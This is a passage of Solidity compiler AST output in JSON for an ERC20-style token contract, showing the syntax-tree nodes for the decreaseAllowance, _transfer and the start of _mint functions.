												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"expression": {
																"argumentTypes": null,
																"id": 754,
																"name": "msg",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1241,
																"src": "4640:3:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_magic_message",
																	"typeString": "msg"
																}
															},
															"id": 755,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "sender",
															"nodeType": "MemberAccess",
															"referencedDeclaration": null,
															"src": "4640:10:1",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														{
															"argumentTypes": null,
															"id": 756,
															"name": "spender",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 746,
															"src": "4652:7:1",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 764,
																	"name": "subtractedValue",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 748,
																	"src": "4698:15:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"expression": {
																	"argumentTypes": null,
																	"baseExpression": {
																		"argumentTypes": null,
																		"baseExpression": {
																			"argumentTypes": null,
																			"id": 757,
																			"name": "_allowances",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 606,
																			"src": "4661:11:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_mapping$_t_address_$_t_mapping$_t_address_$_t_uint256_$_$",
																				"typeString": "mapping(address => mapping(address => uint256))"
																			}
																		},
																		"id": 760,
																		"indexExpression": {
																			"argumentTypes": null,
																			"expression": {
																				"argumentTypes": null,
																				"id": 758,
																				"name": "msg",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 1241,
																				"src": "4673:3:1",
																				"typeDescriptions": {
																					"typeIdentifier": "t_magic_message",
																					"typeString": "msg"
																				}
																			},
																			"id": 759,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"memberName": "sender",
																			"nodeType": "MemberAccess",
																			"referencedDeclaration": null,
																			"src": "4673:10:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_address_payable",
																				"typeString": "address payable"
																			}
																		},
																		"isConstant": false,
																		"isLValue": true,
																		"isPure": false,
																		"lValueRequested": false,
																		"nodeType": "IndexAccess",
																		"src": "4661:23:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																			"typeString": "mapping(address => uint256)"
																		}
																	},
																	"id": 762,
																	"indexExpression": {
																		"argumentTypes": null,
																		"id": 761,
																		"name": "spender",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 746,
																		"src": "4685:7:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		}
																	},
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": false,
																	"nodeType": "IndexAccess",
																	"src": "4661:32:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"id": 763,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "sub",
																"nodeType": "MemberAccess",
																"referencedDeclaration": 1145,
																"src": "4661:36:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																	"typeString": "function (uint256,uint256) pure returns (uint256)"
																}
															},
															"id": 765,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "4661:53:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 753,
														"name": "_approve",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 937,
														"src": "4631:8:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,address,uint256)"
														}
													},
													"id": 766,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "4631:84:1",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 767,
												"nodeType": "ExpressionStatement",
												"src": "4631:84:1"
											},
											{
												"expression": {
													"argumentTypes": null,
													"hexValue": "74727565",
													"id": 768,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "bool",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "4733:4:1",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													},
													"value": "true"
												},
												"functionReturnParameters": 752,
												"id": 769,
												"nodeType": "Return",
												"src": "4726:11:1"
											}
										]
									},
									"documentation": "@dev Atomically decreases the allowance granted to `spender` by the caller.\n\n     * This is an alternative to {approve} that can be used as a mitigation for\nproblems described in {IERC20-approve}.\n\n     * Emits an {Approval} event indicating the updated allowance.\n\n     * Requirements:\n\n     * - `spender` cannot be the zero address.\n- `spender` must have allowance for the caller of at least\n`subtractedValue`.",
									"id": 771,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "decreaseAllowance",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 749,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 746,
												"name": "spender",
												"nodeType": "VariableDeclaration",
												"scope": 771,
												"src": "4556:15:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 745,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "4556:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 748,
												"name": "subtractedValue",
												"nodeType": "VariableDeclaration",
												"scope": 771,
												"src": "4573:23:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 747,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "4573:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "4555:42:1"
									},
									"returnParameters": {
										"id": 752,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 751,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 771,
												"src": "4614:4:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 750,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "4614:4:1",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "4613:6:1"
									},
									"scope": 966,
									"src": "4529:216:1",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "public"
								},
								{
									"body": {
										"id": 808,
										"nodeType": "Block",
										"src": "5217:185:1",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 789,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"baseExpression": {
															"argumentTypes": null,
															"id": 780,
															"name": "_balances",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 600,
															"src": "5228:9:1",
															"typeDescriptions": {
																"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																"typeString": "mapping(address => uint256)"
															}
														},
														"id": 782,
														"indexExpression": {
															"argumentTypes": null,
															"id": 781,
															"name": "sender",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 773,
															"src": "5238:6:1",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": true,
														"nodeType": "IndexAccess",
														"src": "5228:17:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"id": 787,
																"name": "amount",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 777,
																"src": "5270:6:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															],
															"expression": {
																"argumentTypes": null,
																"baseExpression": {
																	"argumentTypes": null,
																	"id": 783,
																	"name": "_balances",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 600,
																	"src": "5248:9:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																		"typeString": "mapping(address => uint256)"
																	}
																},
																"id": 785,
																"indexExpression": {
																	"argumentTypes": null,
																	"id": 784,
																	"name": "sender",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 773,
																	"src": "5258:6:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																},
																"isConstant": false,
																"isLValue": true,
																"isPure": false,
																"lValueRequested": false,
																"nodeType": "IndexAccess",
																"src": "5248:17:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 786,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "sub",
															"nodeType": "MemberAccess",
															"referencedDeclaration": 1145,
															"src": "5248:21:1",
															"typeDescriptions": {
																"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																"typeString": "function (uint256,uint256) pure returns (uint256)"
															}
														},
														"id": 788,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "functionCall",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "5248:29:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "5228:49:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 790,
												"nodeType": "ExpressionStatement",
												"src": "5228:49:1"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 800,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"baseExpression": {
															"argumentTypes": null,
															"id": 791,
															"name": "_balances",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 600,
															"src": "5288:9:1",
															"typeDescriptions": {
																"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																"typeString": "mapping(address => uint256)"
															}
														},
														"id": 793,
														"indexExpression": {
															"argumentTypes": null,
															"id": 792,
															"name": "recipient",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 775,
															"src": "5298:9:1",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": true,
														"nodeType": "IndexAccess",
														"src": "5288:20:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"id": 798,
																"name": "amount",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 777,
																"src": "5336:6:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															],
															"expression": {
																"argumentTypes": null,
																"baseExpression": {
																	"argumentTypes": null,
																	"id": 794,
																	"name": "_balances",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 600,
																	"src": "5311:9:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																		"typeString": "mapping(address => uint256)"
																	}
																},
																"id": 796,
																"indexExpression": {
																	"argumentTypes": null,
																	"id": 795,
																	"name": "recipient",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 775,
																	"src": "5321:9:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																},
																"isConstant": false,
																"isLValue": true,
																"isPure": false,
																"lValueRequested": false,
																"nodeType": "IndexAccess",
																"src": "5311:20:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 797,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "add",
															"nodeType": "MemberAccess",
															"referencedDeclaration": 1120,
															"src": "5311:24:1",
															"typeDescriptions": {
																"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																"typeString": "function (uint256,uint256) pure returns (uint256)"
															}
														},
														"id": 799,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "functionCall",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "5311:32:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "5288:55:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 801,
												"nodeType": "ExpressionStatement",
												"src": "5288:55:1"
											},
											{
												"eventCall": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 803,
															"name": "sender",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 773,
															"src": "5368:6:1",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"id": 804,
															"name": "recipient",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 775,
															"src": "5376:9:1",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"id": 805,
															"name": "amount",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 777,
															"src": "5387:6:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 802,
														"name": "Transfer",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1084,
														"src": "5359:8:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_event_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,address,uint256)"
														}
													},
													"id": 806,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "5359:35:1",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 807,
												"nodeType": "EmitStatement",
												"src": "5354:40:1"
											}
										]
									},
									"documentation": "@dev Moves tokens `amount` from `sender` to `recipient`.\n\n     * This is internal function is equivalent to {transfer}, and can be used to\ne.g. implement automatic token fees, slashing mechanisms, etc.\n\n     * Emits a {Transfer} event.\n\n     * Requirements:\n\n     * - `sender` must have a balance of at least `amount`.",
									"id": 809,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "_transfer",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 778,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 773,
												"name": "sender",
												"nodeType": "VariableDeclaration",
												"scope": 809,
												"src": "5157:14:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 772,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "5157:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 775,
												"name": "recipient",
												"nodeType": "VariableDeclaration",
												"scope": 809,
												"src": "5173:17:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 774,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "5173:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 777,
												"name": "amount",
												"nodeType": "VariableDeclaration",
												"scope": 809,
												"src": "5192:14:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 776,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "5192:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "5156:51:1"
									},
									"returnParameters": {
										"id": 779,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "5217:0:1"
									},
									"scope": 966,
									"src": "5138:264:1",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 851,
										"nodeType": "Block",
										"src": "5740:251:1",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															"id": 821,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 817,
																"name": "account",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 811,
																"src": "5759:7:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "!=",
															"rightExpression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"hexValue": "30",
																		"id": 819,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "5778:1:1",
																		"subdenomination": null,
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_0_by_1",
																			"typeString": "int_const 0"
																		},
																		"value": "0"
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_rational_0_by_1",
																			"typeString": "int_const 0"
																		}
																	],
																	"id": 818,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "5770:7:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_address_$",
																		"typeString": "type(address)"
																	},
																	"typeName": "address"
																},
																"id": 820,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "typeConversion",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "5770:10:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_address_payable",
																	"typeString": "address payable"
																}
															},
															"src": "5759:21:1",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "45524332303a206d696e7420746f20746865207a65726f2061646472657373",
															"id": 822,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "5782:33:1",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_fc0b381caf0a47702017f3c4b358ebe3d3aff6c60ce819a8bf3ef5a95d4f202e",
																"typeString": "literal_string \"ERC20: mint to the zero address\""
															},
															"value": "ERC20: mint to the zero address"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_fc0b381caf0a47702017f3c4b358ebe3d3aff6c60ce819a8bf3ef5a95d4f202e",
																"typeString": "literal_string \"ERC20: mint to the zero address\""
															}
														],
														"id": 816,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															1244,
															1245
														],
														"referencedDeclaration": 1245,
														"src": "5751:7:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 823,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "5751:65:1",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 824,
												"nodeType": "ExpressionStatement",
												"src": "5751:65:1"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 830,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 825,
														"name": "_totalSupply",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 608,
														"src": "5829:12:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"id": 828,
																"name": "amount",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 813,
																"src": "5861:6:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															],
															"expression": {
																"argumentTypes": null,
																"id": 826,
																"name": "_totalSupply",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 608,
																"src": "5844:12:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 827,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "add",
															"nodeType": "MemberAccess",
															"referencedDeclaration": 1120,
															"src": "5844:16:1",
															"typeDescriptions": {
																"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																"typeString": "function (uint256,uint256) pure returns (uint256)"
															}
														},
														"id": 829,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "functionCall",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "5844:24:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "5829:39:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 831,
												"nodeType": "ExpressionStatement",
												"src": "5829:39:1"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 841,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"baseExpression": {
															"argumentTypes": null,
															"id": 832,
															"name": "_balances",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 600,
															"src": "5879:9:1",
															"typeDescriptions": {
																"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																"typeString": "mapping(address => uint256)"
															}
														},
														"id": 834,
														"indexExpression": {
															"argumentTypes": null,
															"id": 833,
															"name": "account",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 811,
															"src": "5889:7:1",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": true,
														"nodeType": "IndexAccess",
														"src": "5879:18:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"id": 839,
																"name": "amount",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 813,
																"src": "5923:6:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															],
															"expression": {
																"argumentTypes": null,
																"baseExpression": {
																	"argumentTypes": null,
																	"id": 835,
																	"name": "_balances",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 600,
																	"src": "5900:9:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																		"typeString": "mapping(address => uint256)"
																	}
																},
																"id": 837,
																"indexExpression": {
																	"argumentTypes": null,
																	"id": 836,
																	"name": "account",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 811,
																	"src": "5910:7:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																},
																"isConstant": false,
																"isLValue": true,
																"isPure": false,
																"lValueRequested": false,
																"nodeType": "IndexAccess",
																"src": "5900:18:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 838,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "add",
															"nodeType": "MemberAccess",
															"referencedDeclaration": 1120,
															"src": "5900:22:1",
															"typeDescriptions": {
																"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																"typeString": "function (uint256,uint256) pure returns (uint256)"
															}
														},
														"id": 840,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "functionCall",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "5900:30:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "5879:51:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 842,
												"nodeType": "ExpressionStatement",
												"src": "5879:51:1"
											},
											{
												"eventCall": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"hexValue": "30",
																	"id": 845,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "5963:1:1",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	},
																	"value": "0"
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	}
																],
																"id": 844,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "5955:7:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_$",
																	"typeString": "type(address)"
																},
																"typeName": "address"
															},
															"id": 846,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "5955:10:1",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														{
															"argumentTypes": null,
															"id": 847,
															"name": "account",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 811,
															"src": "5967:7:1",
															"typeDescriptions": {
